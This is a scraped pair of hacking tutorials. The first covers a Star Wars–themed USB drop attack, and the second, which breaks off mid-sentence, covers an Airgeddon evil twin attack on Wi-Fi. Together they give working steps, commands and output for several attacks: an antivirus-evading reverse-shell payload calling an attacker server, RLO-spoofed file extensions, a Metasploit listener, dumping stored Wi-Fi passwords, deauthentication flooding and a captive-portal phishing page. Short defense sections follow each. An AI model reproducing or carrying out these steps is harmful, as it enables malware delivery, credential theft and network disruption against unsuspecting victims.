        "content": "* WonderHowTo\nThe latest Star Wars movie, Solo: A Star Wars Story, has grossed almost $350 million worldwide during its first month in theaters. This is a good opportunity to discuss how hackers can use media hype (in this case, Hollywood movie hype) to disarm an unsuspecting Windows user into inserting an evil USB stick into their computer.\nA long time ago, in a galaxy far, far away ... a study was conducted that involved 300 malicious USB sticks being dropped by researchers on a university campus in Illinois. Nearly 50% of the USB thumb drives were picked up, and at least one file on each of those USB drives was clicked on.\nThe data showed that attaching keys to the USB's keyring increased the likeliness of the flash drive being inserted into a computer. The presence of keys, no doubt, reinforced the belief that the keys and USB stick were lost and not placed on the ground by a hacker. The data also suggests that USB sticks labeled \"Pictures\" or \"Winter Break Pictures\" are more likely to be inserted by the victim. The addition of keys and label is something to consider when performing USB drops.\n* Don't Miss: Use a Pi as a Dead Drop for Anonymous Offline Comms\nThe researchers' experiment was targeted at university students and professors. It exploited their gullibleness to believe a student could lose their USB flash drive on school property. But what if the target Wi-Fi router isn't located at a university?\nThis type of attack does not have to use the Star Wars franchise as a theme, I'm just a big an of the movies. During a reconnaissance phase, it may be discovered that a target user is wildly obsessed with zombie movies and TV shows. In that scenario, loading the USB stick with content inspired by The Walking Dead or something by an acclaimed horror movie filmmaker would make more sense. The point is to label the USB stick and fill it with content the intended victim will find hard to ignore. Make it enticing and exciting.\nThis attack was performed against a Windows 10 Enterprise machine with Avast antivirus installed\nImage by Sergey Jarochkin/123RF\nStep 1: Purchase the USB Drives & Keys\nAt least one USB flash drive is required for this attack. At the time of this writing, USB sticks can be purchased in bulk using websites like Amazon, Best Buy, and Newegg. I found it's usually possible to find 10 USB thumb drives for roughly $20 USD. Keep in mind, these prices and deals will change over time.\nYou could go for some larger storage capacities, such as 16 GB, to really sell the idea that a movie is on there, but chances are, the user won't even notice the size unless it's written right on the stick, so a smaller, cheaper one will work just fine.\nOn Amazon: 10-Pack ALMEMO 128 MB USB 2.0 Flash Drives, Swivel, Black, for $21 + Free Prime Shipping\nThe addition of keys attached to the USB's keyring will likely increase the likeliness of the USB stick being picked up and used. A local hardware store might be a good place to start looking for stock and inexpensive keys. However, the acquisition of keys is optional. You could use keys from a portable lock or house keys that come with new door knobs — any kind can work if you want to attach keys.\nStep 2: Setup the VPS & Install Metasploit\nA virtual private server (VPS) is needed to host the Metasploit listener. This will allow attackers to execute commands and dump Wi-Fi passwords on the compromised Windows computers. Install the latest version of Metasploit on a VPS with at least 1 GB RAM.\nStep 3: Clone the Unicorn Repository\nIn a local Kali machine (not on the VPS), use Unicorn to create an undetectable payload. Unicorn is an excellent tool for generating sophisticated payloads capable of bypassing antivirus software. Readers who might've missed our article on creating an undetectable payload for Windows 10 should review it as many of the techniques shown there have been adapted into this demo.\nAfter cloning Unicorn, change into the unicorn/ directory, and generate a payload using the below command.\npython unicorn.py windows/shell/reverse_udp 1.2.3.4 53\nThis payload will create a reverse UDP connection (reverse_udp) to the attacker's IP address for the VPS (1.2.3.4) on port number 53. The usage of UDP on port 53 is done in an effort to further disguise the payload and its network activity. Anyone that might be inspecting internet traffic transmitting to and from the compromised Windows computer may confuse the packets for ordinary DNS activity. It won't make it impossible to discover the nefarious packets, but it may aid in evading deep packet inspection (DPI).\nStep 4: Save the Payload\nThen, use cat to view the newly created powershell_attack.txt file in the unicorn/ directory. Highlight the entire PowerShell command and save it to a Windows 10 machine with the file name payload.bat.\nStep 5: Download Star Wars Images & Windows 10 Icons\nReaders can source all kinds of images to serve as file icons. I loaded the USB sticks with multiple payloads, so several pictures were used. These payloads were intermixed with fake Windows 10 files which are also malicious files made to appear ordinary. The fake ZIP file in the below image is a good example of that.\nImages from Unsplash (by Jens Johnsson; James Pond; Daniel Cheung; Saksham Gangwar)\nStep 6: Convert the Images to Icons\nAfter deciding on which images and icons will be used, they should be converted using ConvertICO. Simply upload the desired images to the website and it will reproduce them in ICO format. Save the new ICOs to the Windows 10 machine.\nImages from Unsplash and Looper/YouTube\nStep 7: Set Up & Install B2E on Windows 10\nThen, download and install B2E, a Windows tool designed to convert files into executables. This has been covered several times before, so I'll move on.\nStep 8: Convert the PowerShell Payload to an Executable\nWhen B2E is done installing, import the payload.bat and select the desired ICO. Click the \"Convert\" button to create the EXE, and save the file.\nThis one payload.bat can be used over and over again to create multiple fake files. Just continue to change the ICO files (converted in the previous step) and export using different file names. Each file will appear to be a different image (or file) but really execute the same payload, creating multiple connections to the target Windows computer.\nStep 9: Spoof the File Extensions\nWhen all of the EXEs have been created, rename the files and inject the Right-to-Left Override (RLO) Unicode character to spoof the extensions.\nThe SCR file extension can be substituted for the EXE extension without affecting the payload. This is one of several possible file extension substitutions that allow hackers to cleverly run EXEs. The payload will still execute normally and the SCR extension (\"RCS\" when reversed by RLO) is a lot less obvious than keeping the \"EXE\" in the file name.\nAs shown in the above GIF, all of the files should have their file names and extensions spoofed to appear as ordinary files on the USB drive. If more than one USB stick is being used in the attack, the payloads with spoofed file extensions should be copied to every single USB drive being dropped.\nStep 10: Start Metasploit\nWith the payloads ready to go, it's now safe to start Metasploit on the VPS. In the unicorn/ directory, there's a unicorn.rc resource file used to automate the msfconsole initialization. The resource file should be copied to the VPS. Msfconsole can be started using the below screen msfconsole -r /path/to/unicorn/unicorn.rc command.\nscreen msfconsole -r /path/to/unicorn/unicorn.rc\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMM                MMMMMMMMMM\nMMMN$                           vMMMM\nMMMNl  MMMMM             MMMMM  JMMMM\nMMMNl  MMMMMMMN       NMMMMMMM  JMMMM\nMMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM\nMMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM\nMMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM\nMMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM\nMMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM\nMMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM\nMMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM\nMMMMR  ?MMNM             MMMMM .dMMMM\nMMMMNm `?MMM             MMMM` dMMMMM\nMMMMMMN  ?MM             MM?  NMMMMMN\nMMMMMMMMNe                 JMMMMMNMMM\nMMMMMMMMMMNm,            eMMMMMNMMNMM\nMMMMNNMNMMMMMNx        MMMMMMNMMNMMNM\nMMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM\nhttps://metasploit.com\n=[ metasploit v4.16.60-dev                         ]\n+ -- --=[ 1771 exploits - 1010 auxiliary - 307 post       ]\n+ -- --=[ 537 payloads - 41 encoders - 10 nops            ]\n+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\n[*] Processing /opt/unicorn/unicorn.rc for ERB directives.\nresource (/opt/unicorn/unicorn.rc)> use multi/handler\nresource (/opt/unicorn/unicorn.rc)> set payload windows/shell/reverse_udp\npayload => windows/shell/reverse_udp\nresource (/opt/unicorn/unicorn.rc)> set LHOST 1.2.3.4\nLHOST => 1.2.3.4\nresource (/opt/unicorn/unicorn.rc)> set LPORT 53\nLPORT => 53\nresource (/opt/unicorn/unicorn.rc)> set ExitOnSession false\nExitOnSession => false\nresource (/opt/unicorn/unicorn.rc)> set EnableStageEncoding true\nEnableStageEncoding => true\nresource (/opt/unicorn/unicorn.rc)> exploit -j\n[*] Exploit running as background job 0.\n[*] Started reverse handler on 1.2.3.4:53\nmsf exploit(multi/handler) >\nFor those unfamiliar, \"Screen\" is a program that allows users to manage multiple terminal sessions within the same console. It has the ability to \"detach,\" or close, the terminal window without losing any data running in the terminal. Prepending it to the command will allow attackers to exit their SSH session to the VPS without closing the msfconsole listener.\nStep 11: Label & Drop the USB Sticks\nWhere and how to drop the USB stick(s) varies based on the scenario. If just one individual is being targeted, it would make sense to drop the USB stick near or around their desk, office, driveway, porch, or apartment door.\nFor a mass attack, where a large group of people has access to the target Wi-Fi network, it would be better to drop the USB flash drives in common rooms, parking lots, and community areas to maximize the exposure of the USB drives to as many individuals as possible.\nStep 12: Dump the Wi-Fi Passwords (Post-Exploitation)\nWhen files on a USB drive are opened, a new connection will be established to the VPS. From the msfconsole terminal, use the sessions command to view compromised Windows machines.\nmsf exploit(multi/handler) > sessions\nActive sessions\n===============\nId  Name  Type               Information                                                                       Connection\n--  ----  ----               -----------                                                                       ----------\n1         shell x86/windows  Microsoft Windows [Version 10.0.16299.431] (c) 2017 Microsoft Corporation. Al...  1.2.3.4:53 -> x.x.x.x:53480 (x.x.x.x)\nInteract with the session \"Id\" using the -i argument (session -i 1).\nsession -i 1\nmsf exploit(multi/handler) > sessions -i 1\n[*] Starting interaction with 1...\nMicrosoft Windows [Version 10.0.16299.431]\n(c) 2017 Microsoft Corporation. All rights reserved.\nC:\\Users\\IEUser>\nAt this point, the attacker will be set into a low-privileged Windows (cmd) console. Use the below netsh wlan show profiles command to view Wi-Fi networks the Windows machine has connected to in the past.\nC:\\Users\\IEUser> netsh wlan show profiles\nProfiles on interface Wi-Fi:\nGroup policy profiles (read only)\n---------------------------------\nUser profiles\n-------------\nAll User Profile     : 446CF4\nAll User Profile     : Tatooine\nAll User Profile     : 3PVXQ\nAll User Profile     : Stewie\nAll User Profile     : FiOS-6DH1H\nAll User Profile     : attwifi\nAll User Profile     : Death Star\nAll User Profile     : Belkin.4412\nAll User Profile     : garden-guest\nAll User Profile     : Jedi Temple\nAll User Profile     : cradle233\nAll User Profile     : Lando Calrissian\nAll User Profile     : TransitWirelessWiFi\nAll User Profile     : StudioWifi\nAll User Profile     : ACE Lobby\nAll User Profile     : Lark Cafe\nAll User Profile     : D9F9AD\nTo view the password for a particular Wi-Fi network, use the name and key arguments. The password (\"Attack of The Clones\") can be found on the \"Key Content\" line.\nC:\\Users\\IEUser> netsh wlan show profile name=\"Tatooine\" key=clear\nProfile Tatooine on interface Wi-Fi:\n=======================================================================\nApplied: All User Profile\nProfile information\n-------------------\nVersion                : 1\nType                   : Wireless LAN\nName                   : Tatooine\nControl options        :\nConnection mode    : Connect automatically\nNetwork broadcast  : Connect only if this network is broadcasting\nAutoSwitch         : Do not switch to other networks\nMAC Randomization  : Disabled\nConnectivity settings\n---------------------\nNumber of SSIDs        : 1\nSSID name              : \"Tatooine\"\nNetwork type           : Infrastructure\nRadio type             : [ Any Radio Type ]\nVendor extension          : Not present\nSecurity settings\n-----------------\nAuthentication         : WPA2-Personal\nCipher                 : CCMP\nAuthentication         : WPA2-Personal\nCipher                 : GCMP\nSecurity key           : Present\nKey Content            : Attack of The Clones\nCost settings\n-------------\nCost                   : Unrestricted\nCongested              : No\nApproaching Data Limit : No\nOver Data Limit        : No\nRoaming                : No\nCost Source            : Default\nHow to Protect Against USB Drop Attacks\nThe best thing to do when you've discovered a rogue USB drive is to leave it alone. If there are keys attached to the USB stick and you feel compelled to return them, its okay to be a Good Samaritan — but don't try to find out what's on the USB storage device. As for remediations, the researchers recommend the following.\n* Triple check the USB drive. If the drive seems to be too small for what you think is contained on it, it's likely there's a payload on their waiting for you. Some drives state the storage capacity on them; don't try to plug it in to see.\n* Ban USB drives altogether. While not a very well known feature, Windows lets users ban the use of USB drives for their computers by denying access to the Usbstor.inf file. If it's your workplace, it's not unjust to ban USB accessories on your work computers since there's always cloud storage and fast internet connections.\n* Prevent USB devices from working. If you don't want to ban USB drives altogether, you can use a tool such as killusb to instantly reboot whenever an unknown, untrusted USB device is connected.\n* Don't touch unknown USB sticks. Unless you're in a Taco Bell commercial, you should simply resist the urge to plug any USB stick that you are less than 100% certain is safe into any computer or device you own. If you can practice restraint here, all of the above tips should be useless to you. If you really can't help yourself, use an isolated and offline computer — not your primary, work, school, etc. laptop.\n* Educate computer users. If your relatives, family, friends, and coworkers don't know any better, there's nothing stopping them from being taken advantage of. To prevent this, simply let them know about the danger of plugging in untrusted USB devices.\nIf you just can't help yourself from plugging in a random USB device, then at least:\n* View the details. Use the \"Detailed\" layout view in Windows' File Manager. This will display file type information and may help you spot strange or suspicious file types.\n* Always shown file extensions. Make sure file type extensions are not \"Hidden.\"\nUntil next time, follow me on Twitter @tokyoneon_ and GitHub. And as always, leave a comment below or message me on Twitter if you have any questions.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Stealing Wi-Fi Passwords with an Evil Twin Attack",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-wi-fi-stealing-wi-fi-passwords-with-evil-twin-attack-0183880/",
        "content": "* WonderHowTo\nWhile Wi-Fi networks can be set up by smart IT people, that doesn't mean the users of the system are similarly tech-savvy. We'll demonstrate how an evil twin attack can steal Wi-Fi passwords by kicking a user off their trusted network while creating a nearly identical fake one. This forces the victim to connect to the fake network and supply the Wi-Fi password to regain internet access.\nWhile a more technical user might spot this attack, it's surprisingly effective against those not trained to look for suspicious network activity. The reason it's so successful is that most users don't know what a real firmware update looks like, leading to confusion in recognizing that an attack is in progress.\nWhat Is an Evil Twin Attack\nAn evil twin attack is a type Wi-Fi attack that works by taking advantage of the fact that most computers and phones will only see the \"name\" or ESSID of a wireless network. This actually makes it very hard to distinguish between networks with the same name and same kind of encryption. In fact, many networks will have several network-extending access points all using the same name to expand access without confusing users.\nIf you want to see how this works, you can create a Wi-Fi hotspot on your phone and name it the same as your home network, and you'll notice it's hard to tell the difference between the two networks or your computer may simply see both as the same network. A network sniffing tool like Wigle Wifi on Android or Kismet can clearly see the difference between these networks, but to the average user, these networks will look the same.\nThis works great for tricking a user into connecting if we have a network with the same name, same password, and same encryption, but what if we don't know the password yet? We won't be able to create a network that will trick the user into connecting automatically, but we can try a social engineering attack to try to force the user to give us the password by kicking them off the real network.\nUsing a Captive Portal Attack\nIn a captive portal-style evil twin attack, we will use the Airgeddon wireless attack framework to try to force the user to connect to an open network with the same name as the network they trust. A captive portal is something like the screen you see when connecting to an open network at a coffee shop, on a plane, or at a hotel. This screen that contains terms and conditions is something people are used to seeing, and we'll be using that to our advantage to create a phishing page that looks like the router is updating.\n* Don't Miss: Using Aircrack-ng to Create an Evil Twin Access Point\nDeploying Airgeddon in a coffee shop. Image by Kody/Null Byte\nThe way we'll trick the victim into doing this is by flooding their trusted network with de-authentication packets, making it impossible to connect to the internet normally. When confronted with an internet connection that refuses to connect and won't allow any internet access, the average irritated user will discover an open Wi-Fi network with the same name as the network they are unable to connect to and assume it is related to the problem.\n* Don't Miss: How to Build a Software-Based Wi-Fi Jammer with Airgeddon\nUpon connecting to the network, the victim will be redirected to a phishing page explaining that the router has updated and requires a password to proceed. If the user is gullible, they'll enter the network password here, but that's not where the fun stops. If the victim gets irritated by this inconvenience and types the wrong password, we'll need to make sure we can tell a wrong password from the right one. To do this, we'll capture a handshake from the network first, so we can check each password the user gives us and tell when the correct one is entered.\nTechnologically Assisted Social Engineering\nIn order for this attack to work, a few key requirements need to be met. First, this attack requires a user to do some ignorant things. If the target you are selecting is known for being tech-savvy, this attack may not work. An advanced user, or anyone with any cybersecurity awareness training, will spot this attack in progress and very possibly be aware that it is a relatively close-ranged attack. Against a well-defended target, you can expect this attack to be detected and even localized to find you.\nSecond, a victim must be successfully authenticated from their network, and be frustrated enough to join a totally unknown open network that just appeared out of nowhere and has the same name of the network they trust. Further, attempting to connect to this network (on macOS) even yields a warning that the last time the network was connected to, it had a different kind of encryption.\n* Don't Miss: Crack Weak Wi-Fi Passwords with Airgeddon on Parrot OS\nFinally, the victim must enter the network password into the sometimes sketchy-looking phishing page they are redirected to after joining the open network the attacker has created. There are a lot of clues that could tip a sharp user off to the fact that this page, including the wrong language, wrong brand of router (if the phishing page mentions it), or misspellings and Engrish in the text of the page. Since router pages usually look pretty ugly, these details may not stand out to anyone unfamiliar with what their router's admin page looks like.\nStep 1: Make Sure You Have Everything\nTo prepare our evil twin access point attack, we'll need to be using Kali Linux or another supported distro. Quite a few distributions are supported, and you can check out the Airgeddon GitHub page for more about which Airgeddon will work with.\nYou can use a Raspberry Pi running Kali Linux for this with a wireless network adapter, but you'll need to have access to the GUI and not be SSHed into the Pi, since you'll need to be able to open and navigate multiple windows in this multi-bash script.\nFinally, you'll need a good wireless network adapter for this. In our tests, we found that the TP-Link WN722N v1 and Panda Wireless PAU07 cards performed well with these attacks. You can find more information about choosing a good wireless network adapter at the link below.\n* More Info: The Best Wireless Network Adapters for Wi-Fi Hacking\nStep 2: Install Airgeddon\nTo start using the Airgeddon wireless attack framework, we'll need to download Airgeddon and any needed programs. The developer also recommends downloading and installing a tool called CCZE to make the output easier to understand. You can do so by typing apt-get install ccze a terminal window.\n~# apt-get install ccze\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following package was automatically installed and is no longer required:\nUse 'apt autoremove' to remove it.\nThe following NEW packages will be installed:\n0 upgraded, 1 newly installed, 0 to remove and 1772 not upgraded.\nNeed to get 77.2 kB of archives.\nAfter this operation, 324 kB of additional disk space will be used.\nGet:1 http://archive.linux.duke.edu/kalilinux/kali kali-rolling/main amd64 ccze amd64 0.2.1-4+b1 [77.2 kB]\nFetched 77.2 kB in 1s (77.4 kB/s)\nSelecting previously unselected package ccze.\n(Reading database ... 411785 files and directories currently installed.)\nPreparing to unpack .../ccze_0.2.1-4+b1_amd64.deb ...\nUnpacking ccze (0.2.1-4+b1) ...\nSetting up ccze (0.2.1-4+b1) ...\nProcessing triggers for man-db (2.8.5-2) ...\nNext, we'll install Airgeddon with git clone.\n~# git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git\nCloning into 'airgeddon'...\nremote: Enumerating objects: 6940, done.\nremote: Total 6940 (delta 0), reused 0 (delta 0), pack-reused 6940\nReceiving objects: 100% (6940/6940), 21.01 MiB | 10.31 MiB/s, done.\nResolving deltas: 100% (4369/4369), done.\nThen change directories and start Airgeddon with the following commands.\n~# cd airgeddon\n~/airgeddon# sudo bash ./airgeddon.sh\nIf you see the alien spaceship, you know you're ready to hack.\n************************************ Welcome ************************************\nWelcome to airgeddon script v10.0\n.__                          .___  .___\n_____   |__|______  ____    ____   __| _/__| _/____   _____\n\\__  \\ |  \\_  __ \\/  ___\\_/ __ \\ / __ |/ __ |/  _ \\ /     \\\n/ __ \\|  ||  | \\/  /_/  >  ___// /_/ / /_/ (  <_> )   |   \\\n(____  /__||__|   \\___  / \\___  >____ \\____ |\\____/|___|   /\n\\/          /_____/      \\/     \\/    \\/           \\/\nDevloped by v1s1t0r\n*        .  _.---._          .\n*  . '       ' .  .\n_.-~=============~-._ *\n. (_____________________)        *\n*     \\___________/        .\nStep 3: Configure Airgeddon\nPress Enter to check the various tools the Airgeddon framework relies on. If you're missing any (it'll say \"Error\" next to them), you can hit Y and Enter at the prompt to try and auto-install anything missing, but that generally doesn't work.\nInstead, open a new terminal window and type apt-get install tool, substituting \"tool\" for the name of the missing tool. If that doesn't work, you can also try sudo pip install tool. You should install all the tools, otherwise, you may experience problems during your attack, especially if you are missing dnsspoof.\n*********************************** Welcome ************************************\nThis script is only for educational purposes. Be good boyz&girlz!\nUse it only on your own networks!!\nAccepted bash version (5.0.3(1)-release). Minimum required version: 4.2\nRoot permissions successfully detected\nDetecting resolution... Detected!: 1408x1024\nKnown compatible distros with this script:\n\"Arch\" \"Backbox\" \"BlackArch\" \"CentOS\" \"Cyborg\" \"Debian\" \"Fedora\" \"Gentoo\" \"Kali\" \"Kali arm\" \"Mint\" \"OpenMandriva\" \"Parrot\" \"Parrot arm\" \"Pentoo\" \"Raspbian\" \"Red Hat\" \"SuSE\" \"Ubuntu\" \"Wifislax\"\nDetecting system...\nLet's check if you have installed what script needs\nPress [Enter] key to continue...\nEssential tools: checking...\nifconfig .... Ok\niwconfig .... Ok\nawk .... Ok\nairmon-ng .... Ok\nairodump-ng .... Ok\naircrack-ng .... Ok\nxterm .... Ok\nlspci .... Ok\nOptional tools: checking...\nsslstrip .... Ok\nasleap .... Ok\nbettercap .... Ok\npacketforge-ng .... Ok\netterlog .... Ok\nhashcat .... Ok\nwpaclean .... Ok\njohn .... Ok\naireplay-ng .... Ok\nbully .... Ok\nettercap .... Ok\nmdk4 .... Ok\nhostapd .... Ok\nlighttpd .... Ok\npixiewps .... Ok\nwash .... Ok\nopenssl .... Ok\ndhcpd .... Ok\nreaver .... Ok\ndnsspoof .... Ok\nbeef-xss .... Ok\nhostapd-wpe .... Ok\niptables .... Ok\ncrunch .... Ok\nUpdate tools: checking...\ncurl .... Ok\nYour distro has all necessary essential tools. Script can continue...\nPress [Enter] key to continue...\nWhen you have all of the tools, proceed to the next step by pressing Enter. Next, the script will check for internet access so it can update itself if a newer version exists.\nThe script will check for internet access looking for a newer version. Please be patient...\nThe script is already in the latest version. It doesn't need to be updated\nPress [Enter] key to continue...\nWhen that is done, press Enter to select the network adapter to use. Press the number on your keyboard that correlates to the network adapter in the list, then Enter.\n***************************** Interface selection ******************************\nSelect an interface to work with:\n1.  eth0  // Chipset: Intel Corporation 82540EM\n2.  wlan0 // 2.4Ghz // Chipset: Atheros Communications, Inc. AR9271 802.11n\n*Hint* Every time you see a text with the prefix [PoT] acronym for \"Pending of Translation\", means the translation has been automatically generated and is still pending of review\nAfter we select our wireless network adapter, we'll proceed to the main attack menu.\n***************************** airgeddon main menu ******************************\nInterface wlan0 selected. Mode: Managed. Supported bands: 2.4Ghz\nSelect an option from menu:\n0.  Exit script\n1.  Select another network interface\n2.  Put interface in monitor mode\n3.  Put interface in managed mode\n4.  DoS attacks menu\n5.  Handshake tools menu\n6.  Offline WPA/WPA2 decrypt menu\n7.  Evil Twin attacks menu\n8.  WPS attacks menu\n9.  WEP attacks menu\n10. Enterprise attacks menu\n11. About & Credits\n12. Options and language menu\n*Hint* If you install ccze you'll see some parts of airgeddon in a colorized way with better aspect. It's not a requirement or a dependency, but it will improve the user experience\nPress 2 and Enter to put your wireless card into monitor mode. Next, select option 7 and Enter for the \"Evil Twin attacks\" menu, and you'll see the submenu for this attack module appear.\n**************************** Evil Twin attacks menu ****************************\nInterface wlan0 selected. Mode: Managed. Supported bands: 2.4Ghz\nSelected BSSID: None\nSelected channel: None\nSelected ESSID: None\nSelect an option from menu:\n0.  Return to main menu\n1.  Select another network interface\n2.  Put interface in monitor mode\n3.  Put interface in managed mode\n4.  Explore for targets (monitor mode needed)\n---------------- (without sniffing, just AP) -----------------\n5.  Evil Twin attack just AP\n---------------------- (with sniffing) -----------------------\n6.  Evil Twin AP attack with sniffing\n7.  Evil Twin AP attack with sniffing and sslstrip\n8.  Evil Twin AP attack with sniffing and bettercap-sslstrip2/BeEF\n------------- (without sniffing, captive portal) -------------\n9.  Evil Twin AP attack with captive portal (monitor mode needed)\n*Hint* In order to use the Evil Twin just AP and sniffing attacks, you must have another one interface in addition to the wifi network interface will become the AP, which will provide internet access to other clients on the network. This doesn't need to be wifi, can be ethernet\nStep 4: Select the Target\nNow that we're in our attack module, select option 9 and Enter for the \"Evil Twin AP attack with a captive portal.\" We'll need to explore for targets, so press Enter, and you'll see a window appear that shows a list of all detected networks. You'll need to wait for a little to populate a list of all the nearby networks.\nAn exploration looking for targets is going to be done...\nPress [Enter] key to continue...\n**************************** Exploring for targets ****************************\nExploring for targets option chosen (monitor mode needed)\nSelected interface qlan0mon is in monitor mode. Explorations can be performed\nWPA/WPA2 filter enabled in scan. When started, press [Ctrl+C] to stop...\nPress [Enter] key to continue...\nExploring for targets\nCH 12 ][ Elapsed: 12 s ][ 2019-12-13 05:28\nBSSID          PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n██████████████ -59        9        0    0  11  54e  WPA2 CCMP   PSK  ██████████████\n██████████████ -58        5        0    0  11  54e  WPA2 CCMP   PSK  ██████████████\n██████████████ -80       12        0    0  11  54e. WPA2 CCMP   PSK  ██████████████\n██████████████ -79       14        0    0   6  54e. WPA2 CCMP   PSK  ██████████████\n██████████████ -82        6        0    0   1  54e  WPA2 CCMP   PSK  ██████████████\n██████████████ -83        6        1    0   2  54e  WPA2 CCMP   PSK  ██████████████\n██████████████ -85        2        0    0   6  54e. WPA2 CCMP   PSK  ██████████████\nBSSID            STATION            PWR   Rate     Lost    Frames  Probe\n(not associated) 00:7E:56:97:E9:B0  -68    0 - 1     29         5\n██████████████   E8:1A:1B:D9:75:0A  -38    0 -24e     0         1\n██████████████   62:38:E0:34:6A:7E  -58    0 - 0e     0         1\n██████████████   DC:3A:5E:1D:3E:29  -57    0 -24    148         5\nAfter it runs for about 60 seconds, exit out of the small window, and a list of targets will appear. You'll notice that networks with someone using them appear in yellow with an asterisk next to them. This is essential since you can't trick someone into giving you the password if no one is on the network in the first place.\n**************************** Select target ****************************\nN.      BSSID      CHANNEL  PWR   ENC     ESSID\n------------------------------------------------------\n1)* ██████████████    11    41%   WPA2   ██████████████\n2)* ██████████████    11    20%   WPA2   ██████████████\n3)  ██████████████     6    15%   WPA2   ██████████████\n4)  ██████████████     6    19%   WPA2   ██████████████\n5)  ██████████████     2    17%   WPA2   ██████████████\n6)  ██████████████     1    18%   WPA2   ██████████████\n7)  ██████████████    11    42%   WPA2   ██████████████\n(*) Network with clients\n------------------------------------------------------\nSelect target network:\nSelect the number of the target you wish to attack, and press Enter to proceed to the next screen.\nStep 5: Gather the Handshake\nNow, we'll select the type of de-authentication attack we want to use to kick the user off their trusted network. I recommend the second option, \"Deauth aireplay attack,\" but different attacks will work better depending on the network.\nPress Enter once you've made your selection, and you'll be asked if you'd like to enable DoS pursuit mode, which allows you to follow the AP if it moves to another channel. You can select yes (Y) or no (N) depending on your preference, and then press Enter. Finally, you'll select N for using an interface with internet access. We won't need to for this attack, and it will make our attack more portable to not need an internet source.\nHandshake file selected: None\nSelected internet interface: None\nSelect an option from menu:\n0.  Return to Evil Twin attacks menu\n1.  Deauth / disassoc amok mdk3 attack\n2.  Deauth aireplay attack\n3.  WIDS / WIPS / WDS Confusion attack\n*Hint* If you can't deauth clients from an AP using an attack, choose another one :)\nIf you want to integrate \"DoS pursuit mode\" on an Evil Twin attack, another additional wifi interface in monitor mode will be needed to be able to perform it\nDo you want to enable \"DoS pursuit mode\"? This will launch again the attack if target AP change its channel countering \"channel hopping\" [y/N]\nAt this point there are two options to prepare the captive portal. Either having an interface with internet access, or making a fake DNS using dnsspoof\nAre you going to use the interface with internet access method? If the answer is no (\"n\"), you'll need dnsspoof installed to continue. Both will be checked [y/N]\nNext, it will ask you if you want to spoof your MAC address during the attack. In this case, I chose N for \"no.\"\nNow, if we don't already have a handshake for this network, we'll have to capture one now. Be VERY careful not to accidentally select Y for \"Do you already have a captured Handshake file?\" if you do not actually have a handshake. There is no clear way to go back to the script without restarting if you make this mistake.\nSince we don't yet have a handshake, type N for no, and press Enter to begin capturing.\n******************* Evil Twin AP attack with captive portal *******************\nInterface wlan0mon selected. Mode: Monitor. Supported bands: 2.4Ghz\nSelected BSSID: ██████████████\nSelected channel: 11\nSelected ESSID: ██████████████\nDeauthentication chosen method: Aireplay\nHandshake file selected: None\n*Hint* Sslstrip technique is not infallible. It depends on many factors and not always work. Some browsers such as Mozilla Firefox latest versions are not affected\nDo you want to spoof your MAC address during this attack? [y/N]\nThis attack requires that you have previously a WPA/WPA2 network captured Handshake file\nIf you don't have a captured Handshake file from the target network you can get it now\nDo you already have a captured Handshake file? Answer yes (\"y\") to enter the path or answers no (\"n\") to capture a new one now [y/N]\nOnce the capture process has started, a window with red text sending deauth packets and a window with white text listening for handshakes will open. You'll need to wait until you see \"WPA Handshake:\" and then the BSSID address of your targeted network. In the example below, we're still waiting for a handshake.\nOnce you see that you've got the handshake, you can exit out of the Capturing Handshakewindow. When the script asks you if you got the handshake, select Y, and save the handshake file. Next, select the location for you to write the stolen password to, and you're ready to go to the final step of configuring the phishing page.\nStep 6: Set Up the Phishing Page\nIn the last step before launching the attack, we'll set the language of the phishing page. The page provided by Airgeddon is pretty decent for testing out this style of attack. In this example, we'll select 1 for English. When you've made your selection, press Enter, and the attack will begin with six windows opening to perform various functions of the attack simultaneously.\nSelected BSSID: ██████████████\nSelected channel: 11\nSelected ESSID: ██████████████\nDeauthentication chosen method: Aireplay\nHandshake file selected: /root/handshake-██████████████.cap\nChoose the language in which network clients will see the captive portal:\n0.  Return to Evil Twin attacks menu\n1.  English\n2.  Spanish\n4.  Catalan\n5.  Portuguese\n6.  Russian\n8.  Italian\n*Hint* On Evil Twin attack with BeEF intergrated, in addition to obtaining keys using sniffing techniques, you can try to control the client's browser launching numerous attack vectors. The success of these will depend on many factors such as the kind of client's browser and its version\nStep 7: Capture Network Credentials\nWith the attack underway, the victim should be kicked off of their network and see our fake one as the only seemingly familiar option. Be patient, and pay attention to the network status in the top right window. This will tell you when a device joins the network, allowing you to see any password attempts they make when they're routed to the captive portal.\nWhen the victim joins your network, you'll see a flurry of activity like in the picture below. In the top-right corner, you'll be able to see any failed password attempts, which are checked against the handshake we gathered. This will continue until the victim inputs the correct password, and all of their internet requests (seen in the green text box) will fail until they do so.\nWhen the victim caves and finally enters the correct password, the windows will close except for the top-right window. The fake network will vanish, and the victim will be free to connect back to their trusted wireless network.\nThe credentials should be displayed in the top-right Control screen, and you should copy and paste the password into a file to save, in case the script doesn't save the file correctly. This sometimes happens, so make sure not to forget this step or you might lose the password you just captured.\nEvil Twin AP Info // BSSID: ██████████████ // Channel: 11 // ESSID: ██████████████\nOnline time\nPassword captured successfully:\n/tmp/ag.control.sh: line 37: ${log_path}: ambiguous redirect\n██████████████\nThe password was saved on file: [/root/evil_twin_captive_portal_password-██████████████.██████.txt\nPress [Enter] on the main script window to continue, this window will be closed\nAfter this, you can close the window, and close down the tool by pressing Ctrl + C. If we get a valid credential in this step, then our attack has worked, and we've got the Wi-Fi password by tricking the user into submitting it to our fake AP's phishing page!\nDefending Against an Evil Twin AP Attack\nThe best way of defending against an evil twin attack is to know about the tactic, and know that the signs of one should make you highly suspicious. If you abruptly lose the ability to connect to your trusted 